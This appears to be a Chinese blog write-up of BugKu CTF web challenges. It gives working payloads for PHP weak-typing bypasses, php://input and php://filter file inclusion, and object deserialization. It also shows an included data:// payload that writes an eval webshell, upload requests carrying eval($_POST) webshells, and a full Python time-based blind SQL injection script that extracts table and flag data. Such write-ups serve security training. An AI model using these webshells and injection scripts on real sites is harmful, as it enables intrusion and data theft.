---
title: BugKu-CTF-Web-Write-Up-(2)
date: 2018-03-09 15:29:49
tags:
 - ctf
 - wp
---
[BugkuCTF-新版](http://ctf.bugku.com/challenges)
[Bugku-旧版](http://123.206.31.85/login?next=challenges)

### never give up
右键源代码，会看见`1p.html`的提示，访问后，发现页面会马上跳转，bp直接看响应报文
```javascript
var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
}
OutWord();
```
在控制台里面直接执行代码，会直接发生跳转，所以先赋予变量，在`unescape`，得到内容如下。
```
<script>window.location.href='http://www.bugku.com';</script>
<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->"
```
观察是BASE64编码，那么先解码,得到
```
%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
```
明显的URL编码，在去进行URL解码，得到
```php
if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
```
审计后得知，对与三个变量需要满足以下条件
 1. `$id==0 && !$_GET['id']==False`
 当`$id=a1`，那么利用PHP弱类型特性`"a1==0"`，则满足前者
 并且`a1`自动转换为bool类型为true，则满足后者
 2. `file_get_contents($a,'r')=="bugku is a nice plateform!"`
 当`$a=="php://input"`，`php://input`会拿到POST请求数据流，加上`file_get_content()`就等于打开了php://input请求流，那么拿到的就是POST数据，既可满足
 3. `strlen($b)>5 && eregi("111".substr($b,0,1),"1114") && substr($b,0,1)!=4)`
 当`$b=%0012345`时，eregi()函数具有%00截断漏洞，即可满足条件，具体可看[php函数漏洞小结](http://byxs0x0.top/2018/03/06/php-func-vul/)

 ```
 payload
 http://120.24.86.145:8006/test/hello.php?id=a1&&a=php://input&&b=%00123456
 [POST DATA]
 bugku is a nice plateform!
 ```


<br>
### welcome to bugkuctf
右键源代码，得到
```php
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  

if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}
```
同上题，利用`php://input`来满足`file_get_contents($user,'r')==="welcome to the bugkuctf"`
`include($file)`是典型的文件包含，可以利用php://filter来读取源码，先读取hint.php源码
```
http://120.24.86.145:8006/test1/?txt=php://input&&file=php://filter/read=convert.base64-encode/resource=hint.php&&password=3
[POST DATA]
welcome to the bugkuctf
```
hint.php
```php
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file);
			echo "<br>";
		return ("good");
        }  
    }  
}  
```
flag.php无法读取，那么在读取index.php
```php
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  

if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){
		echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
```
审计后，其实只需要序列化Flag。利用当Flag对象被转换为字符串时，会执行__tostring()，而该方法中，又会包含$file参数并且输出内容，那么只需要Flag的file参数=flag.php，
反序列化后被输出，便会达到任意文件读取的漏洞。
本地执行一下代码，赋值，并且序列化Flag对象
```php
$a = new Flag;
$a->file = "flag.php";
echo serialize($a);
//"Flag":1:{s:4:"file";s:8:"flag.php";}
```
代码从上到下，最开始的条件我们已经满足，所以我们直接包含hint.php文件，将Flag类包含进去，然后利用$password会被反序列化，遍可以得到flag
```
http://120.24.86.145:8006/test1/?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

[POST DATA]
welcome to the bugkuctf
```

还有一条思路就是，直接利用文件包含漏洞任意执行php代码，写入一句话后门。菜刀连接，即可得到flag
```
http://120.24.86.145:8006/test1/?txt=php://input&file=data://text/plain,<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>");phpinfo();  ?>&password=3&a=$_POST[a]
[POST DATA]
welcome to the bugkuctf
```

<br>

### 过狗一句话
根据提示的代码，可以执行任意命令了。
```
得到当前目录列表
http://120.24.86.145:8010/?s=print_r(scandir('./'))

访问flag.txt文件，得到flag
```
<br>


### 字符？正则？
```php
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){
  die('key is: '.$key);
}
```
考验正则表达式，其中有两个注意点是最后的i代表同时匹配大小写字母，[[:punct:]]代表任意标点符号。
`http://120.24.86.145:8002/web10/?id=key1key1234key:/1/1keya.`
<br>


### 前女友(SKCTF)
右键源代码，发现字中藏有链接，点开链接，得到代码
```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
```
`http://118.89.219.210:49162/?v1[]=1&v2[]=2&v3[]=3`
利用PHP弱类型的特性，当md5或strcmp传入数组时，会返回null，来达到绕过。

<br>

### login1(SKCTF)
根据提示利用[SQL约束攻击](http://goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/)，可以构建出与其他用户相同的用户名来达到攻击目的。
先随便注册一个用户，然后进行登录，会发现权限不足，需要admin账户
那么先注册一个用户用户名为`admin                 123`，密码随意，便实现了SQL约束攻击，创建了一个“用户名为admin的账户”，然后账户为`admin`，密码为所填的登录即可。

<br>

### 你从哪里来
应该只是修改referer,但是题目好像有点问题无法做

<br>

### 各种绕过
```php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
```
利用PHP弱类型特性，SHA1()传入数组，会返回null值，那么`sha1($_GET['uname']) === sha1($_POST['passwd']`
```
http://120.24.86.145:8002/web7/?uname[]=123&id=margin
[POST DATA]
passwd[]=1234
```

<br>

### web8
```php
extract($_GET);
if (!empty($ac))
{
  $f = trim(file_get_contents($fn));
  if ($ac === $f)
{
  echo "<p>This is flag:" ." $flag</p>";
}
else
{
  echo "<p>sorry!</p>";
}
}
```
extract可以实现变量覆盖，那么$fn和$ac都是可控变量，在利用php伪协议，便可满足条件
```
http://120.24.86.145:8002/web8/?ac=a&fn=php://input
[POST DATA]
a
```


<br>

### 细心
提示说需要变成admin
进入页面，右键源代码，没有什么信息，然后扫目录，发现有robots.txt文件，访问后得到还有`/resusl.php`页面。
访问后发现IP会被记录在日志中,并且页面会根据`if ($_GET[x]==$password)`来判断你是否是管理员，初次思考，觉得是SQL注入，得到管理员密码登录，然后测试多次后，无果。
第二条思路，尝试弱口令爆破，发现`x=admin`时，得到flag。


<br>

### 求getshell
看了别人的writeup知道解法，觉得如果经过代码审计后可以知道。但是按照常规思路还是很困难，不过CTF不就是需要脑洞吗。
解法需要两点，
 - Content-Type值大小写混写
 - 上传php5后缀的文件。
```http
POST /web9/index.php HTTP/1.1
Host: 120.24.86.145:8002
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: Multipart/form-data; boundary=---------------------------175241886012639
Content-Length: 330

-----------------------------175241886012639
Content-Disposition: form-data; name="file"; filename="php.php5"
Content-Type: image/gif

GIF9a
<?php
@eval($_POST[byxs]);
?>
-----------------------------175241886012639
Content-Disposition: form-data; name="submit"

Submit
-----------------------------175241886012639--
```
<br>

### INSERT INTO注入
题目直接给了源码，查看知道insert注入，注意代码中对`,`进行了处理
```
由于不出现报错信息，也不回显插入信息，所以不能利用报错注入
检测出注入点，可时间盲注
X-Forwarded-For: 1' and sleep(2)) #
```
后来写出python脚本，编程太渣，人工查看
```python
# -*- coding:utf-8 -*-
import requests


DATA = ""
# 遍历循环所有的字符可能
for i in range(1, 100):
    print("-"*50 + str(i) + "-"*50)
    for j in range(32, 128):
        # 发送请求
        url = "http://120.24.86.145:8002/web15/"
        # 得到当前数据库 (web15)
        # payload = "1' and (select case when (ascii(mid(database() from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end))#"
        # 得到当前数据库的所有表名 (client_ip,flag)
        # payload = "1' and (select case when (ascii(mid(group_concat(table_name) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from information_schema.tables where table_schema = 0x7765623135))# "
        # 得到当前表的所有列名 (flag)
        # payload = "1' and (select case when (ascii(mid(group_concat(column_name) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from information_schema.columns where table_name = 0x666c6167))# "
        # 得到指定字段所有数据
        payload = "1' and (select case when (ascii(mid(group_concat(flag) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from flag))# "
        header = {"X-Forwarded-For": payload}
        try:
            # 没超时
            requests.get(url, headers=header, timeout=10)
        except requests.exceptions.Timeout:
            # 超时，说明匹配
            DATA += chr(j)
            print(DATA)
            break
# 循环到结尾,说明已经到最后一个字符串，停止并输出结果

# 这边没有做处理，直接看i是否重复出现两次，如果重复说明到结尾了
```
<br>

### 这是一个神奇的登录框

<br>

### 多次

<br>

### PHP_encrypt_1(ISCCCTF)

<br>

### 文件包含2
进入页面，发现文件包含漏洞，利用php伪协议或者http都发现被过滤
然后看一下hello.php，这边有个坑的点，响应报文提示了`include.php`，但是没这文件，可能不是这个意思吧？
右键源代码，发现`upload.php`
接下来思路比较明确，上传一个带有php代码的文件，然后包含即可。
然而发现对`<?php`和`?>`也有着过滤，并且大小写不能突破，那么利用<sciprt>的方式绕过，上传的文件内容如下
```
GIF9a
<script language="php">
@eval($_POST[byxs])
</script>
```
<br>

### flag.php
脑洞打开，**hint居然是参数参数参数!!!!**
`http://120.24.86.145:8002/flagphp/?hint=1`得到下面代码(删减版)
```php
error_reporting(0);
include_once("flag.php");
$cookie = $_COOKIE['ISecer'];
if(isset($_GET['hint'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
$KEY='ISecer:www.isecer.com';
```
审计过后，只需要反序列化后的$cookie参数和$KEY相同，然后注意的是，$KEY在开始并没有被定义。
在本地调试，得到序列化结果
```php
$cookie = serialize('');
echo $cookie; //s:0:"";
var_dump(unserialize($cookie) === "$KEY"); //bool(true)
```
发送HTTP请求，带上Cookie参数即可得到flag (注意Cookie中的;需要经过URL编码)
```http
GET /flagphp/ HTTP/1.1
Host: 120.24.86.145:8002
Cookie: ISecer=s:0:""%3b
Connection: close
```

<br>

### Web2

<br>

### Web2

<br>
